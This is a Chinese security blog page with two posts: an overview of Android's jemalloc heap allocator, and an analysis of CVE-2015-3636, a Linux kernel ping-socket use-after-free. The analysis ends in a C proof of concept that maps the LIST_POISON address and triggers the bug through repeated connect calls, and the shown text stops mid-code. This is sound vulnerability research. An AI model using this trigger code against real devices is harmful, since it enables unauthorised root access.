<!DOCTYPE html>
<html lang="zh-Hans">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png">
  <link rel="mask-icon" href="/images/favicon.png" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="BruceFan&#39;s Blog">
<meta property="og:url" content="http://example.com/page/5/index.html">
<meta property="og:site_name" content="BruceFan&#39;s Blog">
<meta property="og:locale">
<meta property="article:author" content="Bruce Fan">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/5/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-Hans'
  };
</script>

  <title>BruceFan's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">BruceFan's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Stay hungry, stay foolish</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/08/08/%E5%AD%A6%E4%B9%A0Android%E4%B8%8A%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E9%85%8Djemalloc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/08/08/%E5%AD%A6%E4%B9%A0Android%E4%B8%8A%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E9%85%8Djemalloc/" class="post-title-link" itemprop="url">学习Android上的内存分配jemalloc</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-08-08 22:25:10" itemprop="dateCreated datePublished" datetime="2017-08-08T22:25:10+08:00">2017-08-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>之前写过<a target="_blank" rel="noopener" href="http://pwn4.fun/2016/04/11/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3glibc-malloc/">一篇文章</a>介绍过libc malloc，主要是PC上的malloc机制。这篇文章要介绍的是jemalloc，Android早在5.0就切换到了jemalloc。所以想要学习Android上堆相关的漏洞利用就要对jemalloc有所了解。</p>
<h2 id="jemalloc基础"><a href="#jemalloc基础" class="headerlink" title="jemalloc基础"></a>jemalloc基础</h2><p>jemalloc内部结构如下图所示：<br><img src="/images/jemalloc/memory-org.png"><br><strong>1.region</strong><br>region是调用malloc返回给用户的实际内存，在内存中连续分布，不包含元数据。根据大小不同，划分为三种类型：</p>
<ul>
<li>small 最大0x3800字节，相同大小的small region在同一个run里；</li>
<li>large 最大0x3E000字节（Android6），规整到页大小的整数倍；</li>
<li>huge 大于0x3E000字节（Android6），规整到chunk大小（4MB）的整数倍。</li>
</ul>
<p><strong>2.run</strong><br>run是存放连续的大小相同的region的容器，大小为页大小的整数倍，内部存放small/large类型的region，也不包含元数据。<br><strong>3.chunk</strong><br>chunk是存放run的容器，大小为4MB（可调）或其倍数，且为4MB对齐，操作系统返回的内存被划分到chunk中管理。chunk中存储着关于自身以及它管理的run的元数据。<br>chunk中的元数据结构，mapbit[0]与mapmisc[0]指向chunk中的第一个run：<br><img src="/images/jemalloc/je-chunk.png"><br>chunk元数据中mapmisc中的bitmap结构管理着run中的region的分配使用：<br><img src="/images/jemalloc/chunk-md.png"><br>Android6 -&gt; Android7的变化<br>1.chunk大小：</p>
<table>
<thead>
<tr>
<th align="left">Arch</th>
<th align="left">32-bit</th>
<th align="left">64-bit</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Android6</td>
<td align="left">0x40000</td>
<td align="left">0x40000</td>
</tr>
<tr>
<td align="left">Android7</td>
<td align="left">0x80000</td>
<td align="left">0x200000</td>
</tr>
</tbody></table>
<p>2.元数据的变化<br>增加了mapbias与mapbits flags</p>
<h2 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h2><p><strong>1.small region溢出</strong><br><img src="/images/jemalloc/smallregion.png"><br><strong>2.run溢出</strong><br><img src="/images/jemalloc/runoverflow.png"><br><strong>3.chunk溢出</strong><br><img src="/images/jemalloc/chunkoverflow.png"></p>
<h2 id="jemalloc内存管理"><a href="#jemalloc内存管理" class="headerlink" title="jemalloc内存管理"></a>jemalloc内存管理</h2><p><strong>arena内存分配器</strong><br>用来缓解线程间分配memory时的竞争问题，每个进程中有多个arena（arena数量由jemalloc配置决定，在Android上硬编码为两个）。每一个arena彼此独立，管理各自的chunk。每个线程在第一次malloc时，建立起与各自的arena的联系，一个线程只指向一个arena。<br>在malloc申请内存中，arena与线程缓存的关系：<br><img src="/images/jemalloc/tcache.png"><br>申请的内存在jemalloc内部实际是通过arena分配的，且在每一个线程中都有一个缓存（tcache）。<br>每个arena都有一个bin数组，每一个bin中存放着对应size的run（有size相同的small region），用红黑树按地址排序存储未满的run。runcur指向目前正在使用的run。<br>通过arena分配内存流程：</p>
<ul>
<li>找到对应的bin</li>
<li>从bin中选择一个run（runcur）</li>
<li>从run中分配出一个region</li>
</ul>
<p><img src="/images/jemalloc/arena_alloc.png"><br>通过arena释放内存流程，找到存放region的run，然后释放这个region。<br><img src="/images/jemalloc/arena_free.png"><br><strong>线程缓存（tcache）</strong><br>每一个线程维护着一个对small/large内存分配的缓存tcache，tcache有一个tbin数组，每一个tbin存放着对应size的region缓存栈。分配内存时，没有直接去通过arena要region，而是先去查找对应的tbin存栈avail：<br><img src="/images/jemalloc/tcache2.png"><br>线程申请内存时，会从缓存栈顶pop出一个最近被free到缓存栈上的内存地址，作为新malloc的返回地址。直至缓存栈为空，再向arena申请对应size的region，arena向缓存栈中填充，将内存地址压入缓存栈。<br><img src="/images/jemalloc/fillstack.png"><br>线程缓存在释放内存时的作用：将释放的内存地址压入缓存栈。<br><img src="/images/jemalloc/pushstack.png"><br>同样，缓存栈满了之后，也会将对应的region还给arena，还的数量是缓存栈的一半。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里只讲了一些比较基础的东西，还有很多细节没有讲到，比如分配和释放时的函数流程，对应的结构等，因为我看的文章讲的都有一些不同，这是因为jemalloc版本更新很快。所以真正想要深入理解jemalloc只能看jemalloc的源码喽。<br>后面有空的话会找一些jemalloc相关的练习，结合参考文献中提到的shadow工具来具体调试学习。<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="https://github.com/jemalloc/jemalloc">https://github.com/jemalloc/jemalloc</a><br>Exploit Android jemalloc<br><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/3786.html">基于jemalloc的Android漏洞利用技巧—-CENSUS</a><br><a target="_blank" rel="noopener" href="http://blog.csdn.net/koozxcv/article/details/50973217"> jemalloc内存分配器详解</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/08/03/CVE-2015-3636%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/08/03/CVE-2015-3636%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">CVE-2015-3636漏洞分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-08-03 00:04:13" itemprop="dateCreated datePublished" datetime="2017-08-03T00:04:13+08:00">2017-08-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>CVE-2015-3636是一个Android系统上可通用的root提权漏洞，这种提权漏洞的挖掘越来越困难，一方面是因为Android系统碎片化十分严重，另一方面是漏洞缓冲机制的不断引入。</p>
<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>该漏洞属于Linux Kernel级别的use-after-free漏洞，存在于Linux内核的ping.c文件中。当用户态调用系统调用<code>socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP)</code>，用返回的socket文件描述符作为参数调用系统调用<code>connect()</code>，并且connect的第二个参数中<code>sa_family == AF_UNSPEC</code>时，就会因为访问0x200200这个地址引起系统crash。如果攻击者巧妙地填充或者覆盖PING socket对象，就能达到获取root权限的目的。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>从补丁源码可以看出里面添加了<code>sk_nulls_node_init(sk-&gt;nulls_node);</code>一行代码，通过查看该函数的实现，这个函数的作用是将参数node的pprev成员赋为NULL。<br>include/net/sock.h</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">sk_nulls_node_init</span><span class="params">(struct hlist_nulls_node *node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    node-&gt;pprev = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来我们跟踪一下代码执行流程。调用<code>connect()</code>时会进入到<code>inet_dgram_connect()</code>函数中，过程如下：<br>net/socket.c</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(connect, <span class="keyword">int</span>, fd, struct sockaddr __user *, uservaddr,</span><br><span class="line">        <span class="keyword">int</span>, addrlen)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line">    <span class="keyword">int</span> err, fput_needed;</span><br><span class="line"></span><br><span class="line">    sock = sockfd_lookup_light(fd, &amp;err, &amp;fput_needed);</span><br><span class="line">    ...</span><br><span class="line">    err = sock-&gt;ops-&gt;connect(sock, (struct sockaddr *)&amp;address, addrlen,</span><br><span class="line">                 sock-&gt;file-&gt;f_flags);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>struct socket</code>定义如下：<br>include/linux/net.h</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span>     *<span class="title">sk</span>;</span> <span class="comment">// internal networking protocol agnostic socket representation</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proto_ops</span>  *<span class="title">ops</span>;</span> <span class="comment">// ops: protocol specific socket operations</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中的<code>ops</code>成员被<code>connect()</code>函数中的<code>sockfd_lookup_light()</code>初始化如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proto_ops</span> <span class="title">inet_dgram_ops</span> =</span> &#123;</span><br><span class="line">    .family        = PF_INET,</span><br><span class="line">    .owner         = THIS_MODULE,</span><br><span class="line">    .release       = inet_release,</span><br><span class="line">    .bind          = inet_bind,</span><br><span class="line">    .connect       = inet_dgram_connect, <span class="comment">// 这里的初始化使connect进入inet_dgram_connect函数</span></span><br></pre></td></tr></table></figure>
<p>下面看一下<code>inet_dgram_connect()</code>这个函数，概述中说过因为调用<code>connect()</code>时<code>sa_family == AF_UNSPEC</code>，所以会执行<code>sk-&gt;sk_prot-&gt;disconnect(sk, flags)</code>这行代码。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inet_dgram_connect</span><span class="params">(struct socket *sock, struct sockaddr *uaddr,</span></span></span><br><span class="line"><span class="function"><span class="params">               <span class="keyword">int</span> addr_len, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (addr_len &lt; <span class="keyword">sizeof</span>(uaddr-&gt;sa_family))</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (uaddr-&gt;sa_family == AF_UNSPEC)</span><br><span class="line">        <span class="keyword">return</span> sk-&gt;sk_prot-&gt;disconnect(sk, flags);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!inet_sk(sk)-&gt;inet_num &amp;&amp; inet_autobind(sk))</span><br><span class="line">        <span class="keyword">return</span> -EAGAIN;</span><br><span class="line">    <span class="keyword">return</span> sk-&gt;sk_prot-&gt;connect(sk, uaddr, addr_len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sk_prot</code>是sk对象的一个成员，指向一个包含了确定数量函数指针的指针表，而具体的这些函数执行哪里取决于它的协议类型，这些协议包含TCP、UDP等。因此<code>sk-&gt;sk_prot-&gt;disconnect(sk, flag)</code>这条语句最终是调用的<code>udp_disconnect(struct sock *sk, int flag)</code>这个函数：<br>net/ipv4/udp.c</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">udp_disconnect</span><span class="params">(struct sock *sk, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inet_sock</span> *<span class="title">inet</span> =</span> inet_sk(sk);</span><br><span class="line"></span><br><span class="line">    sk-&gt;sk_state = TCP_CLOSE;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (!(sk-&gt;sk_userlocks &amp; SOCK_BINDPORT_LOCK)) &#123;</span><br><span class="line">        sk-&gt;sk_prot-&gt;unhash(sk);</span><br><span class="line">        inet-&gt;inet_sport = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sk_dst_reset(sk);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在socket对象不绑定端口的情况下，会执行<code>sk-&gt;sk_prot-&gt;unhash(sk)</code>这条语句，最终根据协议类型调用的是<code>ping_v4_unhash(struct sock *sk)</code>：<br>net/ipv4/ping.c</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ping_v4_unhash</span><span class="params">(struct sock *sk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inet_sock</span> *<span class="title">isk</span> =</span> inet_sk(sk);</span><br><span class="line">    pr_debug(<span class="string">&quot;ping_v4_unhash(isk=%p,isk-&gt;num=%u)\n&quot;</span>, isk, isk-&gt;inet_num);</span><br><span class="line">    <span class="keyword">if</span> (sk_hashed(sk)) &#123;</span><br><span class="line">        write_lock_bh(&amp;ping_table.lock);</span><br><span class="line">        hlist_nulls_del(&amp;sk-&gt;sk_nulls_node);</span><br><span class="line">        sock_put(sk);</span><br><span class="line">        isk-&gt;inet_num = <span class="number">0</span>;</span><br><span class="line">        isk-&gt;inet_sport = <span class="number">0</span>;</span><br><span class="line">        sock_prot_inuse_add(sock_net(sk), sk-&gt;sk_prot, <span class="number">-1</span>);</span><br><span class="line">        write_unlock_bh(&amp;ping_table.lock);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>现在程序逻辑进入到了漏洞所在的位置，关注的重点在<code>hlist_nulls_del()</code>和<code>sock_put()</code>这两行，<code>hlist_nulls_del()</code>这句其实是将sk对象在其对应的内核hlist中删除。具体实现如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __hlist_nulls_del(struct hlist_nulls_node *n)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_nulls_node</span> *<span class="title">next</span> =</span> n-&gt;next;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_nulls_node</span> **<span class="title">pprev</span> =</span> n-&gt;pprev;</span><br><span class="line">    *pprev = next;</span><br><span class="line">    <span class="keyword">if</span> (!is_a_nulls(next))</span><br><span class="line">        next-&gt;pprev = pprev;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">hlist_nulls_del</span><span class="params">(struct hlist_nulls_node *n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __hlist_nulls_del(n);</span><br><span class="line">    n-&gt;pprev = LIST_POISON2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就是将n节点从对应链表中删除，并且将n节点的前向二级指针pprev赋值为<code>LIST_POISON2</code>这个值，在内核源码中，这个宏定义为0x200200。<br>第一次调用<code>sin_family == AF_UNSPEC</code>的connect时程序不会产生任何异常，而仅仅只是为了使这个sock对象sk的对应节点成员的pprev值被赋值为0x200200。<br>第二次调用<code>sin_family == AF_UNSPEC</code>的connect时，才会真正触发漏洞使系统crash。这是因为<code>*pprev = next</code>这条语句其实是对第一次节点的删除操作后<code>LIST_POISON2</code>这个指针解引用，让其为next，而在内核中，这个<code>LIST_POISON2</code>地址是不能被访问的，所以会引起系统crash。<br>这里还有一个问题需要说明一下，要使程序能进入<code>if (sk_hashed())</code>逻辑中，必须在前面所说的两次connect之前先用<code>sin_family == AF_INET</code>来调用一次connect()，这样才能使sk对象在内核中是hashed（被加入到内核hlist中）。  </p>
<blockquote>
<p><code>sin_family</code>是<code>sockaddr_in</code>结构体中的成员，<code>sa_family</code>是<code>sockaddr</code>结构体中的成员，作为connect参数时<code>sockaddr_in</code>会被转换为<code>sockaddr</code>，<code>sin_family</code>成员就变成了<code>sa_family</code>。</p>
</blockquote>
<p>完整的poc如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sock_diag.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/inet_diag.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/unix_diag.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MMAP_BASE 0x200000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LIST_POISON 0x200200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MMAP_SIZE 0x200000</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">checkIsVulnerable</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> * magic = mmap((<span class="keyword">void</span> *) MMAP_BASE, MMAP_SIZE,</span><br><span class="line">       PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS,</span><br><span class="line">       <span class="number">-1</span>, <span class="number">0</span>);<span class="comment">//向0x20000到0x40000这个虚拟内存地址映射，并且将这个地址段中所有值设为0</span></span><br><span class="line">    <span class="built_in">memset</span>(magic, <span class="number">0</span>, MMAP_SIZE);</span><br><span class="line">    *((<span class="keyword">long</span> *)(LIST_POISON)) = <span class="number">0xfefefefe</span>;<span class="comment">//给0x200200这个虚拟内存地址中赋值为0xfefefefe；</span></span><br><span class="line">    <span class="keyword">int</span> sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sa</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    sa.sin_family = AF_INET;</span><br><span class="line">    <span class="comment">//  第一次用AF_INET sin_family来connect是为了让sk（sock 对象）在内核中hashed</span></span><br><span class="line">    connect(sock, (<span class="keyword">const</span> struct sockaddr *) &amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    </span><br><span class="line">    sa.sin_family = AF_UNSPEC;</span><br><span class="line">    connect(sock, (<span class="keyword">const</span> struct sockaddr *) &amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    <span class="comment">/* 每次用AF_UNSPEC调用connect会触发inet_dgram_connect（）中的sk-&gt;sk_prot-&gt;disconnect（）逻辑</span></span><br><span class="line"><span class="comment">     * 